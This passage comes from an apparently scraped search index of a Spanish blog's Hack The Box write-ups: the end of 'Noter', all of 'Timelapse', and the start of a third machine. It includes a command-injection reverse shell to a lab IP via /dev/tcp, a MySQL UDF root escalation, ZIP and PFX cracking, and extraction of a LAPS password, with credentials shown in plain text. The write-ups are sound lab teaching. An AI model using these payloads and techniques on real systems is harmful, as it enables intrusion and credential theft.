app_backup_1635803546.zip -rw-r--r-- 1 1003 1003 26298 Dec 01 2021 app_backup_1638395546.zip  Y ya los podemos descargar:\n$ curl ftp://'ftp_admin:ftp_admin%40Noter!'@10.10.11.160/app_backup_1635803546.zip -so app_backup_1635803546.zip $ curl ftp://'ftp_admin:ftp_admin%40Noter!'@10.10.11.160/app_backup_1638395546.zip -so app_backup_1638395546.zip  Ambos archivos ZIP contienen los mismos archivos:\n$ unzip -l app_backup_1638395546.zip Archive: app_backup_1638395546.zip Length Date Time Name --------- ---------- ----- ---- 13507 12-26-2021 22:49 app.py 0 12-26-2021 22:45 misc/ 0 12-26-2021 17:10 misc/attachments/ 46832 12-25-2021 13:09 misc/package-lock.json 0 12-25-2021 13:09 misc/node_modules/ 169 12-26-2021 22:45 misc/md-to-pdf.js 0 12-21-2021 14:15 templates/ 0 12-17-2021 14:51 templates/includes/ 393 12-15-2021 22:07 templates/includes/_messages.html 1229 12-23-2021 11:54 templates/includes/_navbar.html 238 12-15-2021 22:07 templates/includes/_formhelpers.html 503 12-19-2021 20:25 templates/import_note.html 246 12-18-2021 16:44 templates/upgrade.html 816 12-21-2021 20:47 templates/export_note.html 393 12-21-2021 14:15 templates/note.html 537 12-15-2021 22:07 templates/about.html 755 12-15-2021 22:07 templates/register.html 943 12-23-2021 11:54 templates/dashboard.html 242 12-17-2021 14:56 templates/notes.html 525 12-23-2021 15:03 templates/home.html 641 12-23-2021 14:57 templates/layout.html 466 12-16-2021 19:29 templates/add_note.html 467 12-17-2021 14:55 templates/edit_note.html 1036 12-21-2021 16:16 templates/vip_dashboard.html 521 12-17-2021 22:32 templates/login.html --------- ------- 70459 25 files  Pero realmente, los archivos app.py son diferentes (tienen distintos valores CRC):\n$ diff \u0026lt;(unzip -v app_backup_1638395546.zip) \u0026lt;(unzip -v app_backup_1635803546.zip) 1c1 \u0026lt; Archive: app_backup_1638395546.zip --- \u0026gt; Archive: app_backup_1635803546.zip 4c4 \u0026lt; 13507 Defl:N 3138 77% 12-26-2021 22:49 f64d2c7c app.py --- \u0026gt; 9178 Defl:N 2399 74% 12-26-2021 22:48 5c7d6fd3 app.py 30c30 \u0026lt; 70459 22018 69% 25 files --- \u0026gt; 66130 21279 68% 25 files  Análisis de código estático Las líneas de código interesantes de app_backup_1635803546/app.py son credenciales de la base de datos:\n#!/usr/bin/python3 # imports app= Flask(__name__) # Config MySQL app.config['MYSQL_HOST'] ='localhost' app.config['MYSQL_USER'] ='root' app.config['MYSQL_PASSWORD'] ='Nildogg36' app.config['MYSQL_DB'] ='app' app.config['MYSQL_CURSORCLASS'] ='DictCursor' # init MySQL mysql= MySQL(app) # ...  En app_backup_1635803546/app.py estas credenciales son diferentes, pero no parecen correctas. Además, tenemos el código usado para exportar notas de Markdown a PDF:\n@app.route('/export_note_local/\u0026lt;string:id\u0026gt;', methods=['GET']) @is_logged_in defexport_note_local(id): ifcheck_VIP(session['username']): cur=mysql.connection.cursor() result=cur.execute(\"SELECT * FROM notes WHERE id = %sand author = %s\", (id,session['username'])) ifresult\u0026gt;0: note=cur.fetchone() rand_int=random.randint(1,10000) command=f\"node misc/md-to-pdf.js $'{note['body']}' {rand_int}\" subprocess.run(command, shell=True, executable=\"/bin/bash\")  returnsend_file(attachment_dir+str(rand_int) +'.pdf', as_attachment=True) else: returnrender_template('dashboard.html') else: abort(403)  Intrusión en la máquina Aquí hay una vulnerabilidad de inyección de comandos, ya que podemos salir de las comillas simples e inyectar un comando de sistema:\nsubprocess.run(command, shell=True, executable=\"/bin/bash\")  Algo así:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; body = \"'; whoami; echo '\" \u0026gt;\u0026gt;\u0026gt; command = f\"node misc/md-to-pdf.js $'{body}' {1337}\" \u0026gt;\u0026gt;\u0026gt; command \"node misc/md-to-pdf.js $''; whoami; echo '' 1337\"  Entonces, podemos obtener una reverse shell en la máquina.\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Este es el payload que tenemos que poner en una nota:\n'; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash; echo '  Luego exportarla como PDF y obtenemos la conexión de vuelta en nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.160. Ncat: Connection from 10.10.11.160:60110. bash: cannot set terminal process group (257434): Inappropriate ioctl for device bash: no job control in this shell svc@noter:~/app/web$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null svc@noter:~/app/web$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm svc@noter:~/app/web$ export TERM=xterm svc@noter:~/app/web$ export SHELL=bash svc@noter:~/app/web$ stty rows 50 columns 158  En este momento, podemos leer la flag user.txt:\nsvc@noter:~/app/web$ cd svc@noter:~$ cat user.txt 92d9fa6e5b473e1696d8ce38214a5dc6  Enumeración del sistema La enumeración básica muestra que existe un script backup.sh en /opt:\nsvc@noter:~$ ls -la /opt total 12 drwxr-xr-x 2 root root 4096 May 2 23:05 . drwxr-xr-x 19 root root 4096 May 2 23:05 .. -rwxr--r-- 1 root root 137 Dec 30 2021 backup.sh svc@noter:~$ cat /opt/backup.sh #!/bin/bash zip -r `echo /home/svc/ftp/admin/app_backup_$(date +%s).zip` /home/svc/app/web/* -x /home/svc/app/web/misc/node_modules/**\\*  Pero no parece que se ejecute por otro usuario.\nSi usamos linpeas.sh, vemos que MySQL está configurado para ejecutarse como root:\n╔══════════╣ Searching mysql credentials and exec From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user = root Found readable /etc/mysql/my.cnf [client-server] !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/  Esto es un problema porque podemos ejecutar comandos como root mediante User Defined Functions (UDF). En este artículo se muestran los archivos y pasos necesarios para completar el exploit. Necesitaremos este programa en C.\nEscalada de privilegios Solamente tenemos que seguir los pasos del artículo.\nEn primer lugar, descargamos y compilamos el exploit:\nsvc@noter:~$ cd /tmp svc@noter:/tmp$ wget -q 10.10.17.44/raptor_udf2.c svc@noter:/tmp$ gcc -g -c raptor_udf2.c svc@noter:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc  Para acceder a MySQL podemos usar las credenciales que encontramos en app.py. Luego, podemos continuar con la explotación para configurar /bin/bash como binario SUID:\nsvc@noter:/tmp$ mysql --user=root --password=Nildogg36 Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 12759 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)]\u0026gt; show variables like '%plugin%'; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ 2 rows in set (0.001 sec) MariaDB [(none)]\u0026gt; show variables like '%secure_file_priv%'; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_file_priv | | +------------------+-------+ 1 row in set (0.001 sec) MariaDB [(none)]\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [mysql]\u0026gt; create table foo(line blob); Query OK, 0 rows affected (0.005 sec) MariaDB [mysql]\u0026gt; insert into foo values(load_file('/tmp/raptor_udf2.so')); Query OK, 1 row affected (0.002 sec) MariaDB [mysql]\u0026gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; Query OK, 1 row affected (0.001 sec) MariaDB [mysql]\u0026gt; create function do_system returns integer soname 'raptor_udf2.so'; Query OK, 0 rows affected (0.001 sec) MariaDB [mysql]\u0026gt; select * from mysql.func; +-----------+-----+----------------+----------+ | name | ret | dl | type | +-----------+-----+----------------+----------+ | do_system | 2 | raptor_udf2.so | function | +-----------+-----+----------------+----------+ 1 row in set (0.000 sec) MariaDB [mysql]\u0026gt; select do_system('chmod 4755 /bin/bash'); +-----------------------------------+ | do_system('chmod 4755 /bin/bash') | +-----------------------------------+ | 0 | +-----------------------------------+ 1 row in set (0.003 sec) MariaDB [mysql]\u0026gt; exit Bye  Y ahora /bin/bash es SUID:\nsvc@noter:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash  Por lo que podemos ejecutar Bash como root:\nsvc@noter:/tmp$ bash -p bash-5.0# cat /root/root.txt 55410fc79784d12a27222bcce0528f14  ","image":"/images/HTB/Noter/Noter.png","permalink":"https://7rocky.github.io/htb/noter/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina tiene una aplicación web hecha en Flask para gestionar notas en Markdown y PDF. Podemos extraer la clave secreta usada para firmar las cookies de sesión y falsificar cookies para enumerar usuarios. Una vez que tenemos un usuario privilegiado, podemos acceder al servidor FTP y analizar el código fuente de la aplicación web para descubrir una vulnerabilidad de inyección de comandos. Luego, podemos acceder a la máquina y ver que MySQL se ejecuta como root, lo cual permite la escalada de privilegios","time":8,"title":"Noter"},{"contents":"  SO: Windows   Dificultad: Fácil   Dirección IP: 10.10.11.152   Fecha: 26 / 03 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.152 -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692,53215 Nmap scan report for 10.10.11.152 Host is up (0.11s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-28 00:13:43Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 |_ssl-date: 2022-03-28T00:15:13+00:00; +8h18m23s from scanner time. |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | tls-alpn: |_ http/1.1 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49692/tcp open msrpc Microsoft Windows RPC 53215/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-03-28T00:14:36 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: 8h18m22s, deviation: 0s, median: 8h18m22s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 100.14 seconds  La máquina tiene abiertos los puertos 53 (DNS),88 (Kerberos), 135 (MS-RPC), 389 (LDAP), 445 (SMB) y 5986 (WinRM/SSL), entre otros.\n$ crackmapexec smb 10.10.11.152 SMB 10.10.11.152 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)  Además, vemos que la máquina es un controlador de dominio (DC) de un entorno de Active Directory (AD). Podemos empezar añadiendo timelapse.htb en /etc/hosts.\nEnumeración por SMB Podemos empezar mirando por SMB con una sesión nula:\n$ smbclient -L 10.10.11.152 -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available  Vemos que hay un recurso compartido llamado shares. Podemos conectarnos a este y listar algunas carpetas:\n$ smbclient //10.10.11.152/Shares -N Try \"help\" to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Mon Oct 25 10:39:15 2021 .. D 0 Mon Oct 25 10:39:15 2021 Dev D 0 Mon Oct 25 14:40:06 2021 HelpDesk D 0 Mon Oct 25 10:48:42 2021 6367231 blocks of size 4096. 2285718 blocks available smb: \\\u0026gt; cd Dev smb: \\Dev\\\u0026gt; dir . D 0 Mon Oct 25 14:40:06 2021 .. D 0 Mon Oct 25 14:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 10:46:42 2021 6367231 blocks of size 4096. 2285702 blocks available smb: \\Dev\\\u0026gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (8.4 KiloBytes/sec) (average 8.4 KiloBytes/sec) smb: \\Dev\\\u0026gt; cd ..\\HelpDesk\\ smb: \\HelpDesk\\\u0026gt; dir . D 0 Mon Oct 25 10:48:42 2021 .. D 0 Mon Oct 25 10:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 09:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 09:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 09:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 09:57:44 2021 6367231 blocks of size 4096. 2285718 blocks available smb: \\HelpDesk\\\u0026gt; mget * Get file LAPS.x64.msi? y getting file \\HelpDesk\\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (545.5 KiloBytes/sec) (average 475.1 KiloBytes/sec) Get file LAPS_Datasheet.docx? y getting file \\HelpDesk\\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (265.6 KiloBytes/sec) (average 445.1 KiloBytes/sec) Get file LAPS_OperationsGuide.docx? y getting file \\HelpDesk\\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (654.5 KiloBytes/sec) (average 500.1 KiloBytes/sec) Get file LAPS_TechnicalSpecification.docx? y getting file \\HelpDesk\\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (176.6 KiloBytes/sec) (average 468.0 KiloBytes/sec) smb: \\HelpDesk\\\u0026gt; exit  Nos hemos descargado todos estos archivos:\n winrm_backup.zip LAPS.x64.msi LAPS_Datasheet.docx LAPS_OperationsGuide.docx LAPS_TechnicalSpecification.docx  Rompiendo archivos El archivo ZIP está protegido con contraseña:\n$ unzip -l winrm_backup.zip Archive: winrm_backup.zip Length Date Time Name --------- ---------- ----- ---- 2555 2021-10-25 09:21 legacyy_dev_auth.pfx --------- ------- 2555 1 file $ unzip winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password:  Podemos utilizar fcrackzip para encontrar la contraseña mediante un ataque de fuerza bruta:\n$ fcrackzip -uDp $WORDLISTS/rockyou.txt winrm_backup.zip PASSWORD FOUND!!!!: pw == supremelegacy  $ unzip -P supremelegacy winrm_backup.zip Archive: winrm_backup.zip inflating: legacyy_dev_auth.pfx  El archivo ZIP contiene un archivo PFX, que contiene un par de claves para conectarnos por WinRM al puerto 5986, no 5985 como normalmente. Esto es porque se está utilizando SSL y por ello necesitamos claves pública y privada para conectarnos.\nPodemos extraer estas claves mediante openssl:\n$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv-key.pem Enter Import Password: Can't read Password  Pero necesitamos otra contraseña porque supremelegacy no funciona.\nEncontré una herramienta llamada crackpkcs12 para realizar un ataque de fuerza bruta:\n$ ./crackpkcs12 -d $WORDLISTS/rockyou.txt legacyy_dev_auth.pfx Dictionary attack - Starting 1 threads ********************************************************* Dictionary attack - Thread 1 - Password found: thuglegacy *********************************************************  Y obtenemos otra contraseña, vamos entonces a coger las claves:\n$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv-key.pem Enter Import Password: MAC verified OK $ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pub-key.pem Enter Import Password: MAC verified OK  Y ahora podemos usar evil-winrm para conectarnos a la máquina (no hay necesidad de poner usuario/contraseña porque ya vienen en las claves):\n$ evil-winrm -i 10.10.11.152 --ssl -k priv-key.pem -c pub-key.pem Evil-WinRM shell v3.3 Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; type ..\\Desktop\\user.txt 76a99a6d71f58a99a2844eb3b48334e3  Y ahí tenemos la flag user.txt.\nEnumeración del sistema Vamos a enumerar usuarios:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; cd ..\\.. *Evil-WinRM* PS C:\\Users\u0026gt; dir Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 10/23/2021 11:27 AM Administrator d----- 10/25/2021 8:22 AM legacyy d-r--- 10/23/2021 11:27 AM Public d----- 10/25/2021 12:23 PM svc_deploy d----- 2/23/2022 5:45 PM TRX *Evil-WinRM* PS C:\\Users\u0026gt; net user legacyy User name legacyy Full Name Legacyy Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 10/23/2021 12:17:10 PM Password expires Never Password changeable 10/24/2021 12:17:10 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 3/28/2022 5:10:20 PM Logon hours allowed All Local Group Memberships *Remote Management Use Global Group memberships *Domain Users *Development The command completed successfully. *Evil-WinRM* PS C:\\Users\u0026gt; net user svc_deploy User name svc_deploy Full Name svc_deploy Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 10/25/2021 12:12:37 PM Password expires Never Password changeable 10/26/2021 12:12:37 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 3/28/2022 1:16:01 AM Logon hours allowed All Local Group Memberships *Remote Management Use Global Group memberships *LAPS_Readers *Domain Users The command completed successfully. *Evil-WinRM* PS C:\\Users\u0026gt; net user TRX User name TRX Full Name TRX Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2/23/2022 6:43:45 PM Password expires Never Password changeable 2/24/2022 6:43:45 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 3/27/2022 10:29:10 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Domain Admins The command completed successfully.  Vemos que svc_deploy pertenece a LAPS_Readers y que TRX pertenece a Domain Admins.\nLAPS son las siglas de Local Account Password Solution, que genera una contraseña segura para los administradores (los documentos de Word proporcionan dicha información). Si conseguimos acceder como svc_deploy seremos capaces de ver la contraseña de LAPS.\nDespués de un tiempo de enumeración, descubrimos que legacyy tiene un historial de PowerShell con comandos interesantes:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; dir C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline Directory: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/3/2022 11:46 PM 434 ConsoleHost_history.txt *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; type C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt whoami ipconfig /all netstat -ano |select-string LIST $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) invoke-command -computername localhost -credential $c -port 5986 -usessl - SessionOption $so -scriptblock {whoami} get-aduser -filter * -properties * exit  Ahí tenemos la contraseña de svc_deploy. Ahora podemos ejecutar comandos cono svc_deploy mediante script blocks:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p) *Evil-WinRM* PS C:\\Users\\legacyy\\Documents\u0026gt; Invoke-Command -ComputerName localhost -Credential $c -Port 5986 -usessl -SessionOption $so -ScriptBlock { whoami } timelapse\\svc_deploy  E incluso nos podemos conectar por evil-winrm:\n$ evil-winrm -i 10.10.11.152 --ssl -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' Evil-WinRM shell v3.3 Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents\u0026gt;  Escalada de privilegios Pero lo más importante es que podemos leer la contraseña configurada por LAPS mediante crackmapexec:\n$ crackmapexec ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps LDAP 10.10.11.152 389 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) LDAP 10.10.11.152 389 DC01 [+] timelapse.htb\\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV LAPS 10.10.11.152 389 DC01 [*] Getting LAPS Passwords LAPS 10.10.11.152 389 DC01 Computer: DC01$ Password: h!0yj-1WI(YlDIz+2Il@w1/(  Y ahora tenemos acceso como Administrator:\n$ evil-winrm -i 10.10.11.152 --ssl -u Administrator -p 'h!0yj-1WI(YlDIz+2Il@w1/(' Evil-WinRM shell v3.3 Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type ..\\Desktop\\root.txt Cannot find path 'C:\\Users\\Administrator\\Desktop\\root.txt' because it does not exist. At line:1 char:1 + type ..\\Desktop\\root.txt + ~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (C:\\Users\\Administrator\\Desktop\\root.txt:String) [Get-Content], ItemNotFoundException + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand  ¿Pero dónde está la flag root.txt? Pues habrá que buscarla:\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; Get-ChildItem root.txt -Path C:\\Users\\ -Recurse Directory: C:\\Users\\TRX\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 3/28/2022 6:16 PM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; type C:\\Users\\TRX\\Desktop\\root.txt 1505bebfda29707adf43cf8530421b35  ","image":"/images/HTB/Timelapse/Timelapse.png","permalink":"https://7rocky.github.io/htb/timelapse/","section":"htb","summary":"Hack The Box. Windows. Máquina fácil. Esta máquina presenta un entorno de Active Directory (AD) donde se puede encontrar un archivo cifrado ZIP mediante SMB. Podemos obtener la contraseña y obtener un archivo PFX con claves públicas y privadas para WinRM. De nuevo, se puede obtener la contraseña y conseguir las claves para conectarse a la máquina. Existe un historial de comandos en PowerShell donde se encuentra una contraseña para un miembro del grupo LAPS, el cual puede mostrar la contraseña de Administrator. Para comprometer esta máquina se necesitan conocimientos de enumeración y explotación en Windows","time":6,"title":"Timelapse"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.154   Fecha: 02 / 04 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.154 -p 22,80 Nmap scan report for 10.10.11.154 Host is up (0.041s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA) | 256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA) |_ 256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519) 80/tcp open http nginx | http-title: Agency - Start Bootstrap Theme |_Requested resource was /index.php?page=default.html Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 8.11 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración Si vamos a http://10.10.11.154, veremos una página como esta:\nSolamente muestra un poco de información sobre algo llamado EMUEMU y OSTRICH. Ni idea aún.\nVamos a aplicar fuzzing para enumerar más rutas. Nótese que estoy usando extensiones .php y .html:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.154/FUZZ -e .php,.html index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 50ms] default.html [Status: 200, Size: 11414, Words: 4081, Lines: 189, Duration: 39ms] assets [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 39ms] css [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 40ms] beta.html [Status: 200, Size: 4144, Words: 1137, Lines: 73, Duration: 71ms] js [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 42ms] [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]  Genial, tenemos beta.html. Vamos a ver qué hay:\nPodemos subir un archivo de licencia, y debería tener 512 bits. No hay más información sobre esto. Si tratamos de subir algo, la respuesta del servidor está vacía, y da igual lo que subamos, no hay respuesta.\nEl formulario se envía a activate_license.php:\nAcceso a la máquina Como el index.php acepta un parámetro llamado page, pide a gritos introducir payloads de tipo Local File Inclusion o Directory Path Traversal. Vamos a probar:\n$ curl '10.10.11.154?page=/etc/passwd' root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:105::/nonexistent:/usr/sbin/nologin _chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin vagrant:x:1000:1000::/vagrant:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin dev:x:1001:1001::/home/dev:/bin/bash  Genial, tenemos una vulnerabilidad de Directory Path Traversal (ya que el archivo solamente se lee, no se ejecuta).\nExplotación de Directory Path Traversal Vamos a ver el código fuente en PHP:\n$ curl '10.10.11.154?page=index.php'  \u0026lt;?php function sanitize_input($param) { $param1 = str_replace(\"../\", \"\", $param); $param2 = str_replace(\"./\", \"\", $param1); return $param2; } $page = $_GET['page']; if (isset($page) \u0026amp;\u0026amp; preg_match(\"/^[a-z]/\", $page)) { $page = sanitize_input($page); } else { header('Location: /index.php?page=default.html'); } readfile($page);  Una cosa que podemos ver es que el navegador aplicará una redirección a index.php?page=default.html, por lo que no notaremos que el archivo se renderiza en la respuesta. Como curl no hace la redirección por defect, podemos leer la respuesta incluso si contiene una redirección.\nAhora vamos a ver cómo se gestiona la subida del archivo:\n$ curl '10.10.11.154?page=activate_license.php'  \u0026lt;?php if (isset($_FILES['licensefile'])) { $license = file_get_contents($_FILES['licensefile']['tmp_name']); $license_size = $_FILES['licensefile']['size']; $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); if (!$socket) { echo \"error socket_create()\\n\"; } if (!socket_connect($socket, '127.0.0.1', 1337)) { echo \"error socket_connect()\" . socket_strerror(socket_last_error()) . \"\\n\"; } socket_write($socket, pack(\"N\", $license_size)); socket_write($socket, $license); socket_shutdown($socket); socket_close($socket); }  Interesante, se está conectando a un servidor de sockets en local en el puerto 1337 y le pasa el tamaño del archivo y su contenido.\nComo tenemos una vulnerabilidad de Directory Path Traversal, podemos enumerar procesos leyendo desde /proc/\u0026lt;PID\u0026gt;. Cada directorio \u0026ldquo;PID\u0026rdquo; contiene algunos archivos relacionados con el proceso en sí. Nos interesa 